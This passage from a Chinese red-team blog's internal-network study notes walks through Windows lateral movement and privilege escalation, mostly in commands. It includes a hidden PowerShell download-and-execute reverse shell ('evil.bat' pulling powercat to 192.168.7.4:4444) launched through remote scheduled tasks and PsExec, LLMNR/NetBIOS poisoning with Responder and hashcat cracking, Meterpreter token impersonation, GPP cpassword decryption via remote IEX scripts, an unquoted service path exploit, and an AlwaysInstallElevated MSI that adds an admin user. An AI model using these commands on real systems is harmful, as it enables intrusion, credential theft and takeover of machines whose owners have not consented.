连接后，使用计划任务运行可执行文件，主要步骤如下：</p><p>1、查看目标主机时间</p><p>2、上传可执行文件到目标主机</p><p>3、设置计划任务执行可执行文件</p><p>4、删除计划任务</p><p>首先查看下目标主机时间</p><pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上开启 nc 监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 bat 程序上传到目标主机</p><pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 at 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想清除 ID 为 1 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 schtasks 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03# 立刻运行名称为 evil 的任务schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想清除名称为 evil 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p><p>PsExec 下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210802180916.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】18、LLMNR 和 NetBIOS 欺骗攻击</title>
      <link href="//210729-191048.html"/>
      <url>//210729-191048.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p><h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p><p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。</p><p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6.</p><p>NetBIOS 提供的三种服务：</p><p>​    i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听。</p><p>​    ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口。</p><p>​    iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口。</p><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><blockquote><p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p></blockquote><p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来，NTLM Hash 支持哈希传递攻击。 </p><p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向。</p><h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h2><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p><p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器。</p><p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值。</p><p>Responder 项目地址：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>Responder 不支持 Windows，这里使用 Kali 进行演示。</p><p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p><pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190444.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再利用 Hashcat 进行碰撞</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190835.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a></p><p><a href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a></p><p><a href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a></p><p><a href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a></p><p><a href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】17、令牌窃取</title>
      <link href="//210729-110334.html"/>
      <url>//210729-110334.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p><h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p><pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729095721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p><p>令牌获取的数量取决于获取到 Shell 的权限等级。</p><p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p><pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100415.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p><p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p><p>Rotten Potato 项目地址：<a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p><p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】16、组策略凭据获取</title>
      <link href="//210728-145329.html"/>
      <url>//210728-145329.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p><p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p><p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p><h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728141704.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p><pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728142511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p><pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728143302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p><p>脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>直接远程下载脚本执行：</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法下载可以使用 github 代理</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者下载到本地，执行也行</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728145138.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】浅谈几个 Windows 错误配置利用的方法</title>
      <link href="//210728-130839.html"/>
      <url>//210728-130839.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限运行、注册表键 AlwaysInstallElevated 等。</p><p>Windows 系统的错误配置除了用来进行提权，还可以用来寻找一些敏感信息，比如在一些安装配置的文件中或许就包含了一些明文账号密码等等。</p><p>接下来，简单看看这些错误配置的利用方法。</p><h1 id="0x01-可信任服务路径漏洞"><a href="#0x01-可信任服务路径漏洞" class="headerlink" title="0x01 可信任服务路径漏洞"></a>0x01 可信任服务路径漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可信任服务路径 ( Trusted Service Paths ) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像这样的路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>刚才说到了这个漏洞利用了 Windows 文件路径解析的特性，那我们先来了解一下这个特性。</p><p>假如有个文件路径是这样的：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。</p><p>以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program.exeC:\Program Files\Common.exeC:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到 Windows 尝试执行了三次才找到真正的程序。</p><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。</p><p>因此是不是说我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重启时，系统就会执行我们的木马程序？</p><p>答案是的。</p><p>同时如果此时程序以 SYSTEM 运行，那我们就将获得一个 SYSTEM 权限的会话。</p><p>铺垫了那么多，现在就来复现一下。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我们可以通过下面的命令来查找系统中存在可信任服务路径的程序。</p><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727144557.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>截图中可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p><p>我们可以直接使用 MSF 利用该漏洞，MSF 版本中利用该漏洞的模块是 trusted_service_path，但是在新版本中该模块的名称已经变更为 unquoted_service_path</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;local&#x2F;unquoted_service_pathset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727153924.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到已经获取到了管理员组账户的权限。</p><h1 id="0x02-注册表键-AlwaysInstallElevated"><a href="#0x02-注册表键-AlwaysInstallElevated" class="headerlink" title="0x02 注册表键 AlwaysInstallElevated"></a>0x02 注册表键 AlwaysInstallElevated</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>注册表 AlwaysInstallElevated 是一个策略设置项。Windows 允许低权限用户以 SYSTEM 权限运行安装文件。</p><p>如果启用此策略设置项，那么任何权限的用户都能以 SYSTEM 权限来安装恶意的 MSI（Microsoft Windows Installer）文件。</p><p>产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能。</p><pre class="line-numbers language-none"><code class="language-none">组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>也可以直接使用命令行开启这两项注册表。</p><pre class="line-numbers language-none"><code class="language-none">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。</p><pre class="line-numbers language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727163421.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>我们可以使用 PowerUp.ps1 脚本里的 Get-RegistryAlwaysInstallElevated 模块来检查相关注册表是否被设置。</p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Get-RegistryAlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727173239.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的。</p><p>运行 PowerUp 的 Write-UserAddMSI 模块</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Write-UserAddMSI&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行完后，会在当前目录下生成一个 UserAdd.msi 程序，此时以普通用户权限执行该 MSI 程序就会创建一个管理员账户。</p><p>直接双击或者命令行启动该 MSI 程序。</p><pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;q &#x2F;i UserAdd.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msiexec 参数介绍：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;quiet：安装过程中禁止向用户发送消息&#x2F;qn：不使用GUI&#x2F;q：隐藏安装界面&#x2F;i：安装程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727165540.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中可以使用 exploit/windows/local/always_install_elevated 模块，直接获取 SYSTEM 权限。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevatedset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img 